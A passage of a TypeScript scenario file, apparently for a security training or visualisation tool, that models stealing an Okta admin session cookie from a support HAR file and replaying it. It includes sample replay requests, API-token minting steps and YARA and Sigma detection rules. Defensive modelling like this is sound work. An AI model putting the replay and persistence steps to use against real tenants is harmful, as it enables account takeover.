      sublabel: '198.51.100.205 (Commercial VPN Exit Node)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary Parsing Customer Support .har Files',
        pidOrPort: 'HTTPS :443 (Cookie: sid=102f8a9c... Replay)',
        privilege: 'Hijacked Okta Super Administrator Session',
        artifacts: [
          'support_ticket_debug.har -> headers: {"name": "Cookie", "value": "sid=102f8a9c7e4b..."}',
          'cURL / Burp Suite replaying sid cookie from new ASN',
        ],
        description:
          'Extracts live sid session cookies from uploaded .har troubleshooting files and replays them against customer Okta tenants.',
      },
    },
    {
      id: 'okta_support_har_artifact',
      label: 'Uploaded Browser .har Capture',
      sublabel: 'admin_troubleshooting.har (Cleartext Headers)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Chrome DevTools HTTP Archive (.har JSON File)',
        pidOrPort: 'Recorded on corp-admin.okta.com',
        privilege: 'Contains Post-MFA Super Admin sid Cookie',
        artifacts: [
          'entries[].request.cookies: [{"name": "sid", "value": "102f8a9c7e4b..."}]',
          'entries[].request.headers: Authorization / X-Okta-XsrfToken',
        ],
        description:
          'Troubleshooting recording created by an IT administrator while logged into the Okta Admin Console without sanitizing cookies.',
      },
    },
    {
      id: 'okta_admin_console_session',
      label: 'Customer Okta Admin Console',
      sublabel: 'corp-admin.okta.com (/admin/dashboard)',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'Okta Identity Provider Admin Control Plane',
        pidOrPort: 'externalSessionId: trs102f8a9c7e4b',
        privilege: 'Super Administrator (ORG_ADMIN)',
        artifacts: [
          'user.session.access_admin_app (Same externalSessionId, New IP/ASN)',
          'Bypassed primary password + FIDO2/Okta Verify MFA prompt',
        ],
        description:
          'Accepts the replayed sid session cookie if Admin Session IP Binding is not enforced on the tenant.',
      },
    },
    {
      id: 'okta_ssws_api_and_idp',
      label: 'Okta API Tokens & Inbound IdP',
      sublabel: '/api/v1/tokens (SSWS Minting & Rogue IdP)',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Okta API Token Management & Identity Federation',
        pidOrPort: 'system.api_token.create & user.lifecycle.create',
        privilege: 'Persistent Super Admin API Access (SSWS Token)',
        artifacts: [
          'system.api_token.create (Token Name: "BackupSyncToken")',
          'user.account.privilege.grant (Super Administrator)',
        ],
        description:
          'Attacker converts the temporary hijacked browser session into a long-lived SSWS API token and creates a backdoor admin account.',
      },
    },
    {
      id: 'cloudflare_beyondtrust_sirt_siem',
      label: 'Okta System Log & SIRT SIEM',
      sublabel: 'Session ASN Roaming + Token Revocation',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'Enterprise SIEM & Okta Identity Threat Protection',
        pidOrPort: 'Okta System Log API (/api/v1/logs)',
        privilege: 'Real-Time Session Revocation & IP Binding',
        artifacts: [
          'Alert: Single externalSessionId used across >1 Autonomous System (ASN)',
          'DELETE /api/v1/users/{id}/sessions (Immediate Session Kill)',
        ],
        description:
          'Detects a single Okta externalSessionId jumping from the corporate office ASN to an external VPN ASN and revokes the session.',
      },
    },
  ],
  processTree: [
    {
      pid: 9204,
      ppid: 1,
      name: 'har_sid_extractor.py',
      commandLine: 'python3 har_sid_extractor.py --input admin_troubleshooting.har --replay-target https://corp-admin.okta.com/admin/dashboard',
      user: 'actor',
      integrity: 'High',
      status: 'malicious',
      activeFromStage: 1,
      apiCalls: [
        'json.load("admin_troubleshooting.har")',
        'requests.get("https://corp-admin.okta.com/admin/dashboard", cookies={"sid": "102f8a9c..."})',
        'requests.post("https://corp-admin.okta.com/api/internal/tokens")',
      ],
      memoryBlocks: [
        {
          address: '0x00007F3D20108000',
          section: 'Parsed .har Cookie Entry (Heap)',
          permissions: 'RW-',
          size: '16 KB',
          status: 'injected',
          description: 'Extracted Okta sid session token and _xsrfToken parsed from the support case .har file.',
          hexPreview: '22 6E 61 6D 65 22 3A 22 73 69 64 22 2C 22 76 61 ("name":"sid","value":"102f8a9c7e4b...")',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'EXTRACTING LIVE SID SESSION COOKIES FROM SUPPORT .HAR FILES',
      subtitle: 'Parsing unsanitized Chrome DevTools HTTP Archive (.har) files for Cookie: sid=...',
      description:
        'When an IT administrator records a browser HTTP Archive (.har) file while troubleshooting an issue in the Okta Admin Console, the JSON file captures every HTTP request header in cleartext—including the active post-MFA session cookie (Cookie: sid=102f8a9c7e4b...). The attacker downloads the .har file and extracts the live sid token.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1539',
      mitreTechniqueName: 'Steal Web Session Cookie',
      activeNodeIds: ['har_token_thief_actor', 'okta_support_har_artifact', 'cloudflare_beyondtrust_sirt_siem'],
      compromisedNodeIds: ['okta_support_har_artifact'],
      keySpecs: [
        { term: 'SOURCE ARTIFACT', value: 'Browser HTTP Archive (.har) Uploaded to Support Portal' },
        { term: 'STOLEN CREDENTIAL', value: 'Cookie: sid=102f8a9c7e4b... & X-Okta-XsrfToken' },
        { term: 'MITRE TECHNIQUE', value: 'T1539 (Steal Web Session Cookie)' },
      ],
    },
    {
      index: 2,
      title: 'REPLAYING SID COOKIE TO BYPASS MFA IN OKTA ADMIN CONSOLE',
      subtitle: 'Impersonating the Super Administrator session from a foreign VPN IP (T1550.004)',
      description:
        'Within minutes of the .har upload, the attacker injects Cookie: sid=102f8a9c7e4b... into a browser/cURL request from an anonymizing VPN IP (198.51.100.205) to https://corp-admin.okta.com/admin/dashboard. Because the sid cookie represents an already-authenticated session, Okta grants access without prompting for password or MFA if Session IP Binding is disabled.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1550.004',
      mitreTechniqueName: 'Use Alternate Authentication Material: Web Session Cookie',
      activeNodeIds: ['har_token_thief_actor', 'okta_admin_console_session', 'cloudflare_beyondtrust_sirt_siem'],
      compromisedNodeIds: ['okta_support_har_artifact', 'okta_admin_console_session'],
      keySpecs: [
        { term: 'SESSION IDENTIFIER', value: 'authenticationContext.externalSessionId = trs102f8a9c7e4b' },
        { term: 'OKTA EVENT TYPE', value: 'user.session.access_admin_app' },
        { term: 'ANOMALY SIGNAL', value: 'Same externalSessionId roaming across distinct ASNs/Countries' },
      ],
    },
    {
      index: 3,
      title: 'MINTING PERSISTENT SSWS API TOKENS & SIRT SESSION REVOCATION',
      subtitle: 'Creating an Okta SSWS API token before SIRT detects ASN roaming and kills the session',
      description:
        'Inside the hijacked Super Admin session, the attacker immediately calls Okta’s token management API (system.api_token.create) to mint a static SSWS API token and create a secondary admin account. As documented by Cloudflare and BeyondTrust, real-time SIEM rules correlating multiple ASNs on a single externalSessionId detect the anomaly and revoke the session and API token.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1098.001',
      mitreTechniqueName: 'Account Manipulation: Additional Cloud Credentials',
      activeNodeIds: ['okta_admin_console_session', 'okta_ssws_api_and_idp', 'cloudflare_beyondtrust_sirt_siem'],
      compromisedNodeIds: ['okta_support_har_artifact', 'okta_admin_console_session', 'okta_ssws_api_and_idp'],
      keySpecs: [
        { term: 'PERSISTENCE EVENT', value: 'system.api_token.create & user.account.privilege.grant' },
        { term: 'SIRT DETECTION', value: 'distinct_count(client.ipAddress) > 1 per externalSessionId' },
        { term: 'DEFENSIVE FIX', value: 'Sanitize .har files (Cloudflare HAR Sanitizer) + Enforce Admin Session IP Binding' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'okta-har-1',
      no: 1,
      stageIndex: 1,
      timestamp: '10:15:02.114',
      sourceNodeId: 'har_token_thief_actor',
      targetNodeId: 'okta_support_har_artifact',
      sourceLabel: 'Threat Actor',
      targetLabel: 'Support .har File',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HAR JSON PARSE',
      shortAction: 'HAR_SID_COOKIE_EXTRACTED',
      info: 'File=admin_troubleshooting.har Extracted="Cookie: sid=102f8a9c7e4b; DT=DI1..."',
      sizeOrCode: 'SID Token Live',
      severity: 'HIGH',
      mitreId: 'T1539',
      explanation: 'Attacker extracts the live Okta sid session token from an unsanitized .har file.',
      rawLog: `{"log":{"entries":[{"request":{"method":"GET","url":"https://corp-admin.okta.com/admin/dashboard","cookies":[{"name":"sid","value":"102f8a9c7e4b9910a"}]}}]}}`,
      detectionRule: {
        type: 'YARA',
        title: 'Detect Unsanitized Okta sid or Authorization Tokens Inside .har Files',
        ruleCode: `rule Unsanitized_HAR_Okta_Session_Cookie {
  strings:
    $har = "\\"log\\": {\\"version\\":"
    $sid = "{\\"name\\": \\"sid\\", \\"value\\": \\""
  condition:
    $har and $sid
}`,
        mitigation: 'Always scrub cookies, Authorization headers, and query tokens using a HAR sanitizer before uploading .har files to any vendor.',
      },
    },
    {
      id: 'okta-har-2',
      no: 2,
      stageIndex: 2,
      timestamp: '10:42:19.608',
      sourceNodeId: 'har_token_thief_actor',
      targetNodeId: 'okta_admin_console_session',
      sourceLabel: 'VPN Exit Node (198.51.100.205)',
      targetLabel: 'Okta Admin Console',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'OKTA user.session.access_admin_app',
      shortAction: 'SESSION_ASN_ROAMING_DETECTED',
      info: 'eventType=user.session.access_admin_app externalSessionId=trs102f8a9c7e4b prevASN=AS13335 newASN=AS9009 clientIP=198.51.100.205',
      sizeOrCode: 'MFA Bypassed via sid',
      severity: 'CRITICAL',
      mitreId: 'T1550.004',
      explanation: 'Okta System Log records an existing authenticated externalSessionId suddenly accessing the Admin Console from a new ASN and IP.',
      rawLog: `{"eventType":"user.session.access_admin_app","actor":{"alternateId":"it-admin@corp.com"},"client":{"ipAddress":"198.51.100.205","userAgent":{"rawUserAgent":"Mozilla/5.0 (X11; Linux x86_64)"}},"authenticationContext":{"externalSessionId":"trs102f8a9c7e4b"},"securityContext":{"asNumber":9009,"asOrg":"M247 Europe SRL"}}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Okta externalSessionId Roaming Across Multiple ASNs or Operating Systems',
        ruleCode: `title: Okta Session Cookie Replay Across Distinct ASNs
logsource:
  product: okta
  service: okta
detection:
  selection:
    eventType: 'user.session.access_admin_app'
  condition: selection | count(securityContext.asNumber) by authenticationContext.externalSessionId > 1`,
        mitigation: 'Enable Okta Admin Console Session IP Binding and Continuous Access Evaluation to reject mid-session ASN changes.',
      },
    },
    {
      id: 'okta-har-3',
      no: 3,
      stageIndex: 3,
      timestamp: '10:43:05.912',
      sourceNodeId: 'okta_admin_console_session',
      targetNodeId: 'okta_ssws_api_and_idp',
      sourceLabel: 'Hijacked Admin Session',
      targetLabel: 'Okta Token API',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'OKTA system.api_token.create',
      shortAction: 'SSWS_API_TOKEN_CREATED',
      info: 'eventType=system.api_token.create target.displayName="BackupSyncToken" externalSessionId=trs102f8a9c7e4b',
      sizeOrCode: 'TOKEN_REVOKED_BY_SIRT',
      severity: 'CRITICAL',
      mitreId: 'T1098.001',
      explanation: 'Attacker mints an Okta SSWS API token from the hijacked session before SIRT automation revokes the session and token.',
      rawLog: `{"eventType":"system.api_token.create","actor":{"alternateId":"it-admin@corp.com"},"client":{"ipAddress":"198.51.100.205"},"authenticationContext":{"externalSessionId":"trs102f8a9c7e4b"},"target":[{"type":"Token","displayName":"BackupSyncToken"}],"outcome":{"result":"SUCCESS"}}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Okta SSWS API Token Created or Super Admin Granted From Untrusted IP',
        ruleCode: `title: Okta API Token Created in Admin Console
logsource:
  product: okta
  service: okta
detection:
  selection:
    eventType:
      - 'system.api_token.create'
      - 'user.account.privilege.grant'
      - 'system.idp.lifecycle.create'
  condition: selection`,
        mitigation: 'Require phishing-resistant FIDO2 re-authentication on every privileged Admin Console action and restrict API token creation to trusted corporate IP zones.',
      },
    },
  ],
};

export const APT_BATCH5_CLOUD_SAAS_SCENARIOS: AttackScenario[] = [
  SNOWFLAKE_UNC5537_SAAS_EXTORTION_SCENARIO,
  AWS_IMDSV1_SSRF_CAPITALONE_STYLE_SCENARIO,
  K8S_RUNC_CVE_2024_21626_LEAKY_VESSELS_SCENARIO,
  MICROSOFT_STORM_0558_MSA_SIGNING_KEY_SCENARIO,
  AZURE_AD_CONNECT_PASS_THE_CERTIFICATE_SCENARIO,
  AWS_COGNITO_IAM_PASSROLE_PRIVESC_SCENARIO,
  SYSDIG_SCARLETEEL_AWS_EKS_TERRAFORM_SCENARIO,
  GCP_SERVICE_ACCOUNT_HMAC_KEY_PIVOT_SCENARIO,
  OKTA_HAR_FILE_SESSION_TOKEN_HIJACK_SCENARIO,
];
